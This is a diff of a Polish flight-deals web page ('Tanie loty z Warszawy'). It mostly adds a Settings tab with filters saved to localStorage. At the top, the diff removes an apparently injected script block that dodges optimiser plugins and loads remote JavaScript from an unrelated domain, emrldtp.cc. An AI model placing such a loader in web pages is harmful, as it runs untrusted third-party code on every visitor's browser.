@@ -4,15 +4,6 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Tanie loty z Warszawy</title>
-<script nowprocket data-noptimize="1" data-cfasync="false" data-wpfc-render="false" seraph-accel-crit="1" data-no-defer="1" data-cmp-ab="2">
-  (function () {
-      var script = document.createElement("script");
-      script.async = 1;
-      script.setAttribute("data-cmp-ab","2");
-      script.src = 'https://emrldtp.cc/NTgzNzU0.js?t=583754';
-      document.head.appendChild(script);
-  })();
-</script>
 <style>
   :root {
     --bg: #f4f5f7;
@@ -45,6 +36,17 @@
   header { padding: 20px 16px 8px; }
   h1 { font-size: 1.5rem; margin: 0 0 4px; }
   .updated, .desc { color: var(--muted); font-size: 0.85rem; margin: 0 0 4px; }
+  .tabs {
+    display: flex; gap: 4px; padding: 8px 16px 0;
+    border-bottom: 1px solid rgba(128,128,128,.25);
+  }
+  .tabs button {
+    flex: 1; max-width: 200px; min-height: 44px;
+    font-size: 1rem; font-weight: 600;
+    background: none; border: none; color: var(--muted);
+    border-bottom: 3px solid transparent; cursor: pointer;
+  }
+  .tabs button.active { color: var(--accent); border-bottom-color: var(--accent); }
   .controls {
     display: flex; gap: 12px; flex-wrap: wrap; align-items: center;
     padding: 8px 16px 16px;
@@ -55,7 +57,7 @@
     font-size: 0.95rem; padding: 8px 10px; border-radius: 8px;
     border: 1px solid var(--muted); background: var(--card); color: var(--text);
   }
-  main { padding: 0 16px 40px; max-width: 640px; margin: 0 auto; }
+  main, #settings { padding: 0 16px 40px; max-width: 640px; margin: 0 auto; }
   .card {
     display: block; text-decoration: none; color: inherit;
     background: var(--card); border-radius: 14px; padding: 16px;
@@ -68,6 +70,12 @@
   .city { font-size: 1.1rem; font-weight: 600; }
   .country, .times, .airline { color: var(--muted); font-size: 0.9rem; }
   .note { color: var(--muted); font-size: 0.8rem; margin-top: 4px; }
+  .badge {
+    display: inline-block; background: var(--badge); color: #fff;
+    font-size: 0.72rem; font-weight: 700; letter-spacing: .03em;
+    padding: 3px 8px; border-radius: 999px; margin-top: 8px;
+  }
+  .badge small { font-weight: 400; opacity: .9; }
   .group { display: block; margin-bottom: 12px; }
   .group .card { margin-bottom: 0; }
   details summary {
@@ -81,13 +89,50 @@
   }
   .alt:last-child { border-bottom: none; }
   .alt .muted { color: var(--muted); }
-  .badge {
-    display: inline-block; background: var(--badge); color: #fff;
-    font-size: 0.72rem; font-weight: 700; letter-spacing: .03em;
-    padding: 3px 8px; border-radius: 999px; margin-top: 8px;
-  }
-  .badge small { font-weight: 400; opacity: .9; }
   .empty, .error { text-align: center; color: var(--muted); padding: 48px 16px; }
+  .empty a { color: var(--accent); }
+  /* Ustawienia */
+  .field { margin-bottom: 18px; }
+  .field label.t { display: block; font-weight: 600; margin-bottom: 4px; }
+  .field .help { color: var(--muted); font-size: 0.8rem; margin-bottom: 6px; }
+  .field input[type=number] {
+    width: 110px; min-height: 44px; font-size: 1rem;
+    padding: 8px 10px; border-radius: 8px;
+    border: 1px solid var(--muted); background: var(--card); color: var(--text);
+  }
+  .field .inline { display: flex; gap: 10px; align-items: center; }
+  .pills { display: flex; flex-wrap: wrap; gap: 6px; }
+  .pill {
+    min-width: 44px; min-height: 44px; padding: 0 12px;
+    border-radius: 999px; border: 1px solid var(--muted);
+    background: var(--card); color: var(--muted);
+    font-size: 0.9rem; cursor: pointer;
+  }
+  .pill.on { background: var(--accent); color: #fff; border-color: var(--accent); }
+  .checks { display: flex; flex-direction: column; gap: 2px; }
+  .checks label {
+    display: flex; align-items: center; gap: 10px;
+    min-height: 44px; font-size: 0.95rem;
+  }
+  .checks input[type=checkbox], .field > label input[type=checkbox] {
+    width: 22px; height: 22px;
+  }
+  .btn {
+    min-height: 44px; padding: 0 20px; border-radius: 10px;
+    border: 1px solid var(--muted); background: var(--card); color: var(--text);
+    font-size: 0.95rem; cursor: pointer;
+  }
+  .btn.primary { background: var(--accent); color: #fff; border-color: var(--accent); }
+  .actions { display: flex; gap: 10px; margin-top: 24px; }
+  .mini { font-size: 0.8rem; color: var(--accent); background: none;
+          border: none; cursor: pointer; padding: 4px; }
+  .toast {
+    position: fixed; left: 50%; bottom: 24px; transform: translateX(-50%);
+    background: var(--accent); color: #fff; padding: 10px 22px;
+    border-radius: 999px; font-size: 0.95rem; opacity: 0;
+    transition: opacity .3s; pointer-events: none;
+  }
+  .toast.show { opacity: 1; }
   @media (min-width: 720px) {
     h1 { font-size: 1.9rem; }
   }
@@ -98,9 +143,16 @@
   <h1>Tanie loty z Warszawy</h1>
   <p class="updated" id="updated"></p>
   <p class="desc" id="desc"></p>
+  <p class="desc" id="settingsLine"></p>
   <p class="desc" id="srcwarn"></p>
 </header>
 
+<div class="tabs">
+  <button id="tabOkazje" class="active">Okazje</button>
+  <button id="tabUstawienia">Ustawienia</button>
+</div>
+
+<div id="viewOkazje">
 <div class="controls">
   <label><input type="checkbox" id="onlyLow"> Tylko rekordowe</label>
   <label>Sortuj:
@@ -118,9 +170,70 @@
 </div>
 
 <main id="list"></main>
+</div>
+
+<section id="settings" style="display:none">
+  <div class="field">
+    <label class="t" for="sPrice">Maksymalna cena (zł)</label>
+    <div class="help" id="sPriceHelp"></div>
+    <input type="number" id="sPrice" min="0" step="10">
+  </div>
+
+  <div class="field">
+    <label class="t">Liczba nocy</label>
+    <div class="help" id="sNightsHelp"></div>
+    <div class="inline">
+      <input type="number" id="sNightsMin" min="1" step="1"> od
+      <input type="number" id="sNightsMax" min="1" step="1"> do
+    </div>
+  </div>
+
+  <div class="field">
+    <label class="t">Dni wylotu</label>
+    <div class="pills" id="sDaysOut"></div>
+  </div>
+
+  <div class="field">
+    <label class="t">Dni powrotu</label>
+    <div class="pills" id="sDaysIn"></div>
+  </div>
+
+  <div class="field">
+    <label class="t" for="sHorizon">Horyzont wyszukiwania</label>
+    <div class="help" id="sHorizonHelp"></div>
+    <div class="inline">wyloty w ciągu najbliższych
+      <input type="number" id="sHorizon" min="1" step="1"> dni</div>
+  </div>
+
+  <div class="field">
+    <label class="t">Lotniska wylotu</label>
+    <div class="checks" id="sOrigins"></div>
+  </div>
+
+  <div class="field">
+    <label class="t">Kraje
+      <button class="mini" id="sCountriesAll">zaznacz wszystkie</button>
+      <button class="mini" id="sCountriesNone">odznacz wszystkie</button>
+    </label>
+    <div class="help">Nowe kraje w ofertach są zaznaczane automatycznie.</div>
+    <div class="checks" id="sCountries"></div>
+  </div>
+
+  <div class="field">
+    <label><input type="checkbox" id="sDirect"> Tylko loty bezpośrednie</label>
+  </div>
+
+  <div class="actions">
+    <button class="btn primary" id="sSave">Zapisz</button>
+    <button class="btn" id="sReset">Przywróć domyślne</button>
+  </div>
+</section>
+
+<div class="toast" id="toast">Zapisano</div>
 
 <script>
 const DNI = ["nd", "pn", "wt", "śr", "cz", "pt", "so"];
+const DNI_KROTKIE = ["Pn", "Wt", "Śr", "Cz", "Pt", "So", "Nd"];
 
 function fmtData(iso) {
   const d = new Date(iso + "T00:00:00");
@@ -133,9 +246,95 @@ function fmtCena(v) {
   return Math.round(v) + " zł";
 }
 
-let deals = [], cfg = null;
-
 const noce = n => n === 1 ? "1 noc" : (n >= 2 && n <= 4 ? n + " noce" : n + " nocy");
+
+let deals = [], cfg = {}, settings = null;
+
+/* ---------- ustawienia ---------- */
+
+function defaults() {
+  return {
+    maxPrice: 250,
+    nightsMin: 2,
+    nightsMax: 5,
+    daysOut: [0, 1, 2, 3, 4, 5, 6],   // 0=pn … 6=nd
+    daysIn: [0, 1, 2, 3, 4, 5, 6],
+    horizonDays: cfg.days_ahead || 120,
+    origins: null,                   // null = wszystkie z danych
+    excludedCountries: [],
+    directOnly: true
+  };
+}
+
+function loadSettings() {
+  try {
+    return Object.assign({}, defaults(),
+      JSON.parse(localStorage.getItem("tl_settings") || "{}"));
+  } catch (e) {
+    return defaults();
+  }
+}
+
+function saveSettings(s) {
+  localStorage.setItem("tl_settings", JSON.stringify(s));
+}
+
+/* Czysta funkcja filtrująca — testowalna poza DOM. */
+function applySettings(deals, s, cfg, today) {
+  const horizon = new Date(today);
+  horizon.setDate(horizon.getDate() + (s.horizonDays || cfg.days_ahead || 365));
+  const horizonIso = horizon.toISOString().slice(0, 10);
+  const origins = s.origins || null;
+  const excl = new Set(s.excludedCountries || []);
+  return deals.filter(d =>
+    d.price <= s.maxPrice &&
+    d.nights >= s.nightsMin && d.nights <= s.nightsMax &&
+    s.daysOut.includes(d.weekday_out) &&
+    s.daysIn.includes(d.weekday_in) &&
+    d.date_out <= horizonIso &&
+    (!origins || origins.includes(d.origin)) &&
+    !excl.has(d.dest_country) &&
+    (!s.directOnly || d.transfers === 0)
+  );
+}
+
+function isDefault(s) {
+  return JSON.stringify(s) === JSON.stringify(defaults());
+}
+
+function settingsSummary(s) {
+  if (isDefault(s)) return "ustawienia domyślne";
+  const parts = ["do " + s.maxPrice + " zł",
+    s.nightsMin + "–" + s.nightsMax + " nocy"];
+  if (s.daysOut.length < 7) {
+    const labels = s.daysOut.slice().sort().map(i => DNI_KROTKIE[i].toLowerCase());
+    parts.push("wylot " + labels.join(", "));
+  }
+  if (s.daysIn.length < 7) {
+    const labels = s.daysIn.slice().sort().map(i => DNI_KROTKIE[i].toLowerCase());
+    parts.push("powrót " + labels.join(", "));
+  }
+  if (s.horizonDays < (cfg.days_ahead || Infinity))
+    parts.push("do " + s.horizonDays + " dni");
+  if (s.origins && s.origins.length < allOrigins().length)
+    parts.push("z " + s.origins.join(", "));
+  const excl = s.excludedCountries || [];
+  if (excl.length)
+    parts.push("bez: " + excl.slice(0, 2).join(", ") +
+      (excl.length > 2 ? " (+" + (excl.length - 2) + ")" : ""));
+  if (!s.directOnly) parts.push("również z przesiadką");
+  return parts.join(" · ");
+}
+
+function allOrigins() {
+  return [...new Set(deals.map(d => d.origin))].sort();
+}
+
+function allCountries() {
+  return [...new Set(deals.map(d => d.dest_country).filter(Boolean))].sort();
+}
+
+/* ---------- renderowanie kart ---------- */
 
 function kartaHtml(d, showBadge) {
   const low = showBadge !== undefined ? showBadge : d.record_low;
@@ -167,14 +366,19 @@ function render() {
   const groupBy = document.getElementById("groupBy").checked;
   const list = document.getElementById("list");
 
-  let items = deals.filter(d => (!onlyLow || d.record_low) &&
-                                (!airline || d.airline === airline));
+  // Najpierw ustawienia użytkownika, potem szybkie filtry.
+  let items = applySettings(deals, settings, cfg, new Date());
+  items = items.filter(d => (!onlyLow || d.record_low) &&
+                            (!airline || d.airline === airline));
   items.sort((a, b) => sort === "date"
     ? a.date_out.localeCompare(b.date_out) || a.price - b.price
     : a.price - b.price);
 
   if (!items.length) {
-    list.innerHTML = '<p class="empty">Brak okazji poniżej progu — sprawdź później</p>';
+    list.innerHTML = deals.length
+      ? '<p class="empty">Brak okazji dla tych ustawień — ' +
+        '<a href="#ustawienia">poluzuj filtry w zakładce Ustawienia</a></p>'
+      : '<p class="empty">Brak okazji poniżej progu — sprawdź później</p>';
     return;
   }
 
@@ -191,7 +395,6 @@ function render() {
     groups.get(key).push(d);
   }
   let gr = [...groups.values()];
-  // Reprezentant grupy = najtańsza oferta; reszta po cenie.
   gr.forEach(g => g.sort((a, b) => a.price - b.price));
   gr.sort((a, b) => sort === "date"
     ? a[0].date_out.localeCompare(b[0].date_out) || a[0].price - b[0].price
@@ -215,6 +418,116 @@ function render() {
   }).join("");
 }
 
+/* ---------- zakładki ---------- */
+
+function showTab(ustawienia) {
+  document.getElementById("tabOkazje").classList.toggle("active", !ustawienia);
+  document.getElementById("tabUstawienia").classList.toggle("active", ustawienia);
+  document.getElementById("viewOkazje").style.display = ustawienia ? "none" : "";
+  document.getElementById("settings").style.display = ustawienia ? "" : "none";
+}
+
+document.getElementById("tabOkazje").onclick = () => { location.hash = ""; showTab(false); };
+document.getElementById("tabUstawienia").onclick = () => { location.hash = "ustawienia"; showTab(true); };
+window.addEventListener("hashchange",
+  () => showTab(location.hash === "#ustawienia"));
+
+/* ---------- formularz ustawień ---------- */
+
+function pillGroup(el, key) {
+  const box = document.getElementById(el);
+  box.innerHTML = "";
+  DNI_KROTKIE.forEach((label, i) => {
+    const b = document.createElement("button");
+    b.type = "button";
+    b.className = "pill" + (settings[key].includes(i) ? " on" : "");
+    b.textContent = label;
+    b.onclick = () => {
+      const arr = settings[key];
+      const idx = arr.indexOf(i);
+      if (idx >= 0) arr.splice(idx, 1); else arr.push(i);
+      b.classList.toggle("on");
+    };
+    box.appendChild(b);
+  });
+}
+
+function fillSettingsForm() {
+  document.getElementById("sPrice").value = settings.maxPrice;
+  document.getElementById("sPrice").max = cfg.max_price_pln || "";
+  document.getElementById("sPriceHelp").textContent =
+    "skrypt zbiera oferty do " + cfg.max_price_pln + " zł";
+  document.getElementById("sNightsMin").value = settings.nightsMin;
+  document.getElementById("sNightsMax").value = settings.nightsMax;
+  document.getElementById("sNightsHelp").textContent =
+    "koperta skryptu: " + cfg.min_nights + "–" + cfg.max_nights + " nocy";
+  document.getElementById("sHorizon").value = settings.horizonDays;
+  document.getElementById("sHorizon").max = cfg.days_ahead || "";
+  document.getElementById("sHorizonHelp").textContent =
+    "maks. " + cfg.days_ahead + " dni (tyle zbiera skrypt)";
+  document.getElementById("sDirect").checked = settings.directOnly;
+
+  pillGroup("sDaysOut", "daysOut");
+  pillGroup("sDaysIn", "daysIn");
+
+  const origins = settings.origins || allOrigins();
+  document.getElementById("sOrigins").innerHTML = allOrigins().map(o => `
+    <label><input type="checkbox" data-origin="${o}"
+      ${origins.includes(o) ? "checked" : ""}> ${o}</label>`).join("");
+
+  renderCountries();
+}
+
+function renderCountries() {
+  const excl = new Set(settings.excludedCountries);
+  document.getElementById("sCountries").innerHTML = allCountries().map(c => `
+    <label><input type="checkbox" data-country="${c}"
+      ${excl.has(c) ? "" : "checked"}> ${c}</label>`).join("");
+  document.querySelectorAll("#sCountries input").forEach(cb =>
+    cb.addEventListener("change", () => {
+      const set = new Set(settings.excludedCountries);
+      if (cb.checked) set.delete(cb.dataset.country);
+      else set.add(cb.dataset.country);
+      settings.excludedCountries = [...set];
+    }));
+}
+
+document.getElementById("sCountriesAll").onclick = () => {
+  settings.excludedCountries = [];
+  renderCountries();
+};
+document.getElementById("sCountriesNone").onclick = () => {
+  settings.excludedCountries = allCountries();
+  renderCountries();
+};
+
+document.getElementById("sSave").onclick = () => {
+  settings.maxPrice = +document.getElementById("sPrice").value || 0;
+  settings.nightsMin = +document.getElementById("sNightsMin").value || 1;
+  settings.nightsMax = +document.getElementById("sNightsMax").value || 1;
+  settings.horizonDays = Math.min(+document.getElementById("sHorizon").value || cfg.days_ahead,
+                                cfg.days_ahead);
+  settings.directOnly = document.getElementById("sDirect").checked;
+  const checked = [...document.querySelectorAll("#sOrigins input:checked")]
+    .map(cb => cb.dataset.origin);
+  settings.origins = checked.length === allOrigins().length ? null : checked;
+  saveSettings(settings);
+  document.getElementById("settingsLine").textContent = settingsSummary(settings);
+  const t = document.getElementById("toast");
+  t.classList.add("show");
+  setTimeout(() => t.classList.remove("show"), 2000);
+  location.hash = "";
+  showTab(false);
+  render();
+};
+
+document.getElementById("sReset").onclick = () => {
+  settings = defaults();
+  fillSettingsForm();
+};
+
+/* ---------- start ---------- */
+
 document.getElementById("onlyLow").addEventListener("change", render);
 document.getElementById("sort").addEventListener("change", render);
 document.getElementById("airline").addEventListener("change", render);
@@ -228,12 +541,14 @@ fetch("deals.json", { cache: "no-store" })
   .then(data => {
     deals = data.deals || [];
     cfg = data.config || {};
+    settings = loadSettings();
     document.getElementById("updated").textContent =
       "Zaktualizowano: " + new Date(data.generated_at).toLocaleString("pl-PL");
     document.getElementById("desc").textContent =
-      "Loty w dwie strony do " + cfg.max_price_pln + " zł, " +
+      "Skrypt zbiera oferty do " + cfg.max_price_pln + " zł, " +
       cfg.min_nights + "–" + cfg.max_nights + " nocy, najbliższe " +
-      cfg.days_ahead + " dni";
+      cfg.days_ahead + " dni — zawęź w Ustawieniach";
+    document.getElementById("settingsLine").textContent = settingsSummary(settings);
     if (!(data.sources || []).includes("aviasales")) {
       document.getElementById("srcwarn").textContent =
         "Źródło: tylko Ryanair (Aviasales nieaktywne — brak tokena)";
@@ -245,6 +560,8 @@ fetch("deals.json", { cache: "no-store" })
         o.value = a; o.textContent = a;
         sel.appendChild(o);
       });
+    fillSettingsForm();
+    showTab(location.hash === "#ustawienia");
     render();
   })
   .catch(e => {
